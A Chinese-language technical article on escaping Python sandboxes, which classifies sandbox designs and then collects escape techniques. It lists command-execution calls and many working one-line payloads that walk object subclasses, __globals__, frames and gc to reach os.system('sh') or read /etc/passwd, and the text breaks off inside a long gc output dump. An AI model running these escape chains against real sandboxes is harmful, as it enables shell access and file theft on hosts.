## Python沙箱简介

Python沙箱是一种安全机制，用于在受限环境中执行不受信任的Python代码，防止其执行非预期的指令对主机系统造成危害。

 



### Python代码执行流程

常见样例

```python
code="import os;os.system('whoami')"
workspace = {}  # 创建一个空字典，用于存储执行后的变量
fun = compile(code, 'run_python', 'exec')  # 编译代码
exec(fun, workspace)  # 在 workspace 中执行编译后的代码
```

Python代码执行流程先由源代码经过语法分析和词法分析解析为抽象语法树，再将AST编译为Python字节码，最后将Python字节码作为Python虚拟机指令执行。

### Python沙箱分类

对于Python沙箱存在多种限制用户执行恶意代码的方法，下面为实际项目测试中遇到的几种场景。

#### 字符串检查

对用户的输入，通过字符串黑名单的方式进行限制，如判断不能出现os.system等字样，防护非常弱存在很多逃逸的可能性。

#### 语法树检查

在代码执行前分析语法树，禁止导入、函数定义等操作，相比纯字符串匹配有一定的加强，可能针对检查的遗漏进行绕过。

#### 动态Hook

在Python进程启动时将识别到的危险方法进行替换，为原始函数添加装饰器，实现动态插桩。

#### Python虚拟机修改

CPython层面裁剪功能，将非必要的能力删除，增加代码逻辑限制，尽可能缩减攻击面。

去除了os.system、os.popen等危险函数的实现，去除了subprocess、ctype等危险模块的实现，修改取值逻辑不允许获取名称带__的字段等。

## 沙箱逃逸漏洞挖掘思路与技巧

### 基本思路

常规的思路：测试一下常见的危险函数能否执行，不进一步思考执行失败的原因。

更好的思路：研究在受限环境中**我们可以做的事情**，分析清楚沙箱所做的所有限制，思考是否存在方法**突破受限环境的限制**。

### 基础知识

#### Python 命名空间

- **内置命名空间（built-in namespace**）， Python 语言**内置**的命名空间，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。
- **全局命名空间（global \**namespace\**）**，模块中定义的命名空间，记录了**模块**的变量，包括函数、类、其它导入的模块、模块级的变量和常量。
- **局部命名空间（local namespace）**，函数中定义的命名空间，记录了**函数**的变量，包括函数的参数和局部定义的变量。（类中定义的也是）

命名空间查找顺序

假设我们要使用变量 runoob，则 Python 的查找顺序为：**局部的命名空间 -> 全局命名空间 -> 内置命名空间**。

如果找不到变量 runoob，它将放弃查找并引发一个 NameError 异常:

```python
NameError: name 'runoob' is not defined。
```

**全局命名空间**

我们可以通过globals()获取在当前全局命名空间下可以直接访问的变量和函数，如果在这些变量或函数中存在危险能力则可以直接使用。

```python
>>> print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
```

**内置命名空间**

通过print(dir(__builtins__))获取在内置命名空间下可以获取的变量和函数，它是 Python 解释器默认加载的核心功能集合，可以直接在代码中使用，无需导入任何模块。

```python
>>> print(dir(__builtins__))
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```

其中有一些函数可以帮助我们逃逸或辅助我们分析

```python
__import__   用于导入模块
__loader__   通过__loader__.load_module 导入模块
__sepc__      通过__spec__.loader.load_module 导入模块
globals 可以列出全局命名空间下的变量
locals 列出局部命名空间下的变量
dir  可以列出对象相关的方法与属性
eval 可以执行任意代码
exec 可以执行任意代码
open 读写文件
```

帮助大家理解的demo

可以看到在全局与内置空间都存在__spec__变量，而在全局空间中他的值为null，在builtin中则是一个ModuleSpec，我们要怎么拿到builtin中的__spec__呢。

```python
>>> print(__spec__)
None
>>> del __spec__ # 从全局命名空间中删除此变量
>>> print(__spec__) # 再次获取则会从内置命名空间中获取
ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in')
```

#### 模块导入

除了内置和当前全局命名空间下的变量与函数，我们也可以通过导入模块的方式使用其他模块命名空间下的变量与函数。

```python
>>> os.system
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'os' is not defined
>>> 
>>> import os
>>> os.system('id')
uid=1001(opsadmin) gid=1001(admingroup) groups=1001(admingroup),10(wheel)
```

#### 类的继承

所有的类均继承自Object基类，Python中一切均为对象。

#### 魔法方法及魔法字段

Object基类的魔法方法及魔法字段

```python
print(dir(object)) # 列出object基类包含的方法及字段

['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```

其他的类型都会在基类的基础上增加字段和方法。

builtin_function_or_method类

```python
print((open.__class__)) # 查看open方法的基类
print((open.__class__.__mro__)) #查看open方法的继承关系
print(dir(open))  #查看builtin_function_or_method类的魔法方法及字段

<class 'builtin_function_or_method'>
(<class 'builtin_function_or_method'>, <class 'object'>)
['__call__', '__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__text_signature__']
```

type类

```python
print(dir(type))

['__abstractmethods__', '__base__', '__bases__', '__basicsize__', '__call__', '__class__', '__delattr__', '__dict__', '__dictoffset__', '__dir__', '__doc__', '__eq__', '__flags__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__instancecheck__', '__itemsize__', '__le__', '__lt__', '__module__', '__mro__', '__name__', '__ne__', '__new__', '__prepare__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasscheck__', '__subclasses__', '__subclasshook__', '__text_signature__', '__weakrefoffset__', 'mro']
```

function类

```python
>>> def a():pass #定义函数
... 
>>> print(a.__class__) # 函数类
<class 'function'>
>>> 
>>> print(a.__class__.__mro__) #继承链
(<class 'function'>, <class 'object'>)
>>> 
>>> print(dir(a)) #函数具备的魔法属性与方法
['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```

其中一些魔法方法和字段的介绍，在分析Python沙箱逃逸时，这些魔法对我们有比较大的帮助

```python
__class__  返回类型
__mro__    返回类继承的所有父类
__subclasses__ 函数获取所有子类
__bases__  返回所有直接父类组成的元组
__init__ 类实例创建之后调用, 对当前对象的实例的一些初始化
__globals__ 能够返回函数所在模块命名空间的所有变量
__getattribute__  当类被调用的时候，无条件进入此函数 ，getattr不可用时替换
__getattr__       对象中不存在的属性时调用
__dir__ 列出所有方法和字段
__code__ 函数对象的属性，存储了函数的 编译后的字节码 和其他执行相关的元数据
__dict__  存放类的静态函数、类函数、普通函数、全局变量以及一些内置的属性
>>> open.__dir__()
['__repr__', '__hash__', '__call__', '__getattribute__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__reduce__', '__module__', '__doc__', '__name__', '__qualname__', '__self__', '__text_signature__', '__str__', '__setattr__', '__delattr__', '__init__', '__new__', '__reduce_ex__', '__subclasshook__', '__init_subclass__', '__format__', '__sizeof__', '__dir__', '__class__']
>>> dir(open)
['__call__', '__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__text_signature__']
>>> 
>>> import os
>>> getattr(os,"system")
<built-in function system>
>>> os.__getattribute__("system")
<built-in function system>
```

### 危险操作

#### 执行系统命令

```python
#os模块
import os
os.system('ls')
os.popen('ls -l').read()
os.execv
os.execve
#subprocess模块：
import subprocess
subprocess.Popen('ls -l',shell=True)
subprocess.call('ls',shell=True)
#platform模块：
import platform
platform.popen('ls').read() #py 2.x
#pty模块
import pty
pty.spawn('ls')
pty.os.system('ls')
#commands模块--python2.x
commands.getoutput('ls')
#_posixsubprocess模块，subprocess的底层实现
import os
import _posixsubprocess
_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) #3.11,不同版本payload不同
#posix模块,为os模块在linux下的底层实现
posix.system('ls')
posix.popen
#nt模块,为os模块在windows下的底层实现
nt.system('ls')
```

#### 文件操作

```python
#codecs模块
import codecs
codecs.open('test.txt').read()
#file()函数
file('test.txt').read() #python2.x
#open()函数
open('text.txt').read() #python3.x
```

#### Ctypes

ctypes库可以加载共享库，直接调用调用C语言共享库中的函数。

##### ctypes.CDLL

```python
import ctypes
# 加载 C 标准库
libc = ctypes.CDLL(None)  # None 表示使用系统默认的 C 库
# 调用 system 函数执行 whoami 命令
command = b"whoami"  # 注意：需要转换为 bytes 类型
result = libc.system(command)
# 输出 system 函数的返回值
print(f"system 函数返回值: {result}")
```

##### ctypes.PyDLL

直接调用Python C API 函数

```python
import ctypes
pydll = ctypes.PyDLL(None)
print(pydll.system(b'whoami'))
```

##### ctypes.pythonapi

ctypes库初始化时会将一个PyDLL对象存放在pythonapi变量中，也可以用这个变量直接调用Python C API 函数。

```python
import ctypes
print(ctypes.pythonapi.system(b'whoami'))
```

##### ctypes.LibraryLoader(ctypes.CDLL).LoadLibrary

```python
import ctypes
ctypes.LibraryLoader(ctypes.CDLL).LoadLibrary('libc.so.6').system(b'whoami')
```

### 间接引用

#### 利用白名单模块间接引入

比如cgi模块中引入了os模块，我们导入cgi模块就会间接导入os模块，从而可使用os模块。

```python
import cgi
print(cgi.os.system('whoami'))
```

#### 利用魔法方法遍历父子类危险函数和信息 

通过魔法方法可以获得很多其他命名空间下的类

```python
print(object.__subclasses__())
print(().__class__.__base__.__subclasses__()) # __base__获得基础类，__subclasses__()获得所有继承类


[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'types.GenericAlias'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'rlcompleter.Completer'>]
```

比如这里面的os._wrap_close 可以通过__globals__获得其模块下的所有方法

```python
>>> print(object.__subclasses__()[133])
<class 'os._wrap_close'>

>>> print(object.__subclasses__()[133].close)
<function _wrap_close.close at 0x7ff1f6768af0>

>>> print(object.__subclasses__()[133].close.__globals__)
{'__name__': 'os', '__doc__': ...... 'execlpe': <function execlpe at 0x7ff1f6767700>, ..... }

>>> print(object.__subclasses__()[133].close.__globals__['system'])
<built-in function system>
```

如果没有os._wrap_close，也可以通过ABC类找到os模块 

可以看到os模块下存在一个class继承自ABC类，那么我们就可以通过ABC类的__subclasses__()找到os.PathLike,再借助底下的function的__globals__找到os模块的所有函数。



```python
>>> print(object.__subclasses__()[112])
<class 'abc.ABC'>
>>> print(object.__subclasses__()[112].__subclasses__())
[<class 'os.PathLike'>]
>>> print(object.__subclasses__()[112].__subclasses__()[0].__fspath__)
<function PathLike.__fspath__ at 0x7f5a22697f70>
>>> print(object.__subclasses__()[112].__subclasses__()[0].__fspath__.__globals__['system'])
<built-in function system>
```

可以通过脚本帮忙查找

```python
def find_os_in_subclass_globals():
    results = []
    for subclass in object.__subclasses__():
        # 遍历子类的所有属性
        for attr_name in dir(subclass):
            if attr_name in ('__abstractmethods__','__annotations__'):
                continue
            attr = getattr(subclass, attr_name)
            # 只检查可调用的对象（函数/方法）
            if callable(attr):
                try:
                    # 获取函数的__globals__属性
                    globals_dict = getattr(attr, '__globals__', {})
                    if globals_dict and 'os' in globals_dict:
                        results.append((subclass, attr_name))
                except Exception:
                    continue
    return results


found = find_os_in_subclass_globals()
if found:
    print("找到包含os模块的函数/方法:")
    for class_name, func_name in found:
        print(f"类: {class_name}, 方法: {func_name}")
else:
    print("未找到包含os模块的函数/方法")
找到包含os模块的函数/方法:
类: <class '_distutils_hack._TrivialRe'>, 方法: __init__
类: <class '_distutils_hack._TrivialRe'>, 方法: match
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: find_spec
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: frame_file_is_setup
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: is_cpython
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: pip_imported_during_build
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: spec_for_distutils
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: spec_for_pip
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: spec_for_sensitive_tests
类: <class '_distutils_hack.DistutilsMetaFinder'>, 方法: spec_for_test.test_distutils
类: <class '_distutils_hack.shim'>, 方法: __enter__
类: <class '_distutils_hack.shim'>, 方法: __exit__
```

列举一些已知的手法

```python
# <class '_frozen_importlib.BuiltinImporter'>
().__class__.__mro__[1].__subclasses__()[104].load_module("os").system("sh");

# <class '_frozen_importlib_external.FileLoader'>
().__class__.__bases__[0].__subclasses__()[118].get_data(".", "/etc/passwd")

# <class '_io._IOBase'> -> <class '_io._RawIOBase'> -> <class '_io.FileIO'>
().__class__.__mro__[1].__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]("/etc/passwd").read()

# <class 'os._wrap_close'>
().__class__.__mro__[1].__subclasses__()[137].__init__.__builtins__["__import__"]("os").system("sh")
().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__["system"]("sh")
().__class__.__mro__[1].__subclasses__()[137].close.__globals__["system"]("sh")

# <class 'subprocess.Popen'>
().__class__.__mro__[1].__subclasses__()[262](["cat","/etc/passwd"], stdout=-1).communicate()[0]

# <class 'abc.ABC'> -> <class 'abc.ABCMeta'>
().__class__.__mro__[1].__subclasses__()[129].__class__.register.__builtins__["__import__"]("os").system("sh")

# <class 'collections.Counter'>
{}.__class__.__subclasses__()[2].copy.__builtins__["__import__"]("os").system("sh")
{}.__class__.__subclasses__()[2].update.__builtins__["__import__"]("os").system("sh")

# <class 'generator'> - instance
(_ for _ in ()).gi_frame.f_globals["__loader__"].load_module("os").system("sh")
(_ for _ in ()).gi_frame.f_globals["__builtins__"].__import__("os").system("sh")

# <class 'async_generator'> - instance
(await _ for _ in ()).ag_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
(await _ for _ in ()).ag_frame.f_globals["_""_builtins_""_"].eval("_""_import_""_('os').system('sh')")
```

#### 利用栈帧

通过生成器获得调用者的全局命名空间

```python
def waff():
    def f():
        yield g
    g = f()  #生成器
    frame = next(g)
    return frame
test = waff()
print(test.f_back.f_globals)
```

通过抛出异常获得调用者的全局命名空间

```python
try:
    raise Exception
except Exception as e:
    print(e.__traceback__.tb_frame.f_globals)
```

通过sys/inspect获得调用者的全局命名空间

```python
import sys
print(sys._getframe(1).f_back.f_globals)

import inspect
print(inspect.currentframe().f_back.f_globals)
```

 

#### gc

gc模块中提供了多个可以获取相关引用、对象的方法，用这个模块可以很容易找到我们想要的对象。

##### gc.get_objects

返回一个列表，可以获得所有的对象，这里以前30个对象作为示例。

```python
import gc
print(gc.get_objects()[:30])

"[('.pyc', <class '_frozen_importlib_external.SourcelessFileLoader'>), {'_loaders': [('.cpython-39-x86_64-linux-gnu.so', <class '_frozen_importlib_external.ExtensionFileLoader'>), ('.abi3.so', <class '_frozen_importlib_external.ExtensionFileLoader'>), ('.so', <class '_frozen_importlib_external.ExtensionFileLoader'>), ('.py', <class '_frozen_importlib_external.SourceFileLoader'>), ('.pyc', <class '_frozen_importlib_external.SourcelessFileLoader'>)], 'path': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend', '_path_mtime': 1739878318.0, '_path_cache': {'text.py', '__init__.py', '__pycache__'}, '_relaxed_path_cache': set()}, set(), {'text.py', '__init__.py', '__pycache__'}, <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, ModuleSpec(name='sympy.plotting.backends.textbackend.text', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, origin='/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py'), {'name': 'sympy.plotting.backends.textbackend.text', 'loader': <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, 'origin': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py', 'loader_state': None, 'submodule_search_locations': None, '_set_fileattr': True, '_cached': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/__pycache__/text.cpython-39.pyc', '_initializing': False}, <module 'sympy.plotting.backends.textbackend.text' from '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py'>, {'__name__': 'sympy.plotting.backends.textbackend.text', '__doc__': None, '__package__': 'sympy.plotting.backends.textbackend', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, '__spec__': ModuleSpec(name='sympy.plotting.backends.textbackend.text', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc615e0>, origin='/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py'), '__file__': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/text.py', '__cached__': '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/textbackend/__pycache__/text.cpython-39.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <function ascii at 0x7f6ab85e2ee0>, 'bin': <function bin at 0x7f6ab85e2f70>, 'breakpoint': <function breakpoint at 0x7f6ab85e8040>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <function delattr at 0x7f6ab85e80d0>, 'dir': <function dir at 0x7f6ab85e8160>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <function format at 0x7f6ab85e81f0>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <function hex at 0x7f6ab85e8280>, 'id': <built-in function id>, 'input': <function input at 0x7f6ab85e83a0>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <function oct at 0x7f6ab85e8430>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <function hook_setattr.<locals>.builtin_setattr_with_checkcode at 0x7f6ab8a58e50>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <function open at 0x7f6ab85e8550>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation.\nAll Rights Reserved.\n\nCopyright (c) 2000 BeOpen.com.\nAll Rights Reserved.\n\nCopyright (c) 1995-2001 Corporation for National Research Initiatives.\nAll Rights Reserved.\n\nCopyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.\nAll Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands\n    for supporting Python development.  See www.python.org for more information., 'license': See https://www.python.org/psf/license/, 'help': Type help() for interactive help, or help(object) for help about object.}, 'base_backend': <module 'sympy.plotting.backends.base_backend' from '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/base_backend.py'>, 'LineOver1DRangeSeries': <class 'sympy.plotting.series.LineOver1DRangeSeries'>, 'textplot': <function textplot at 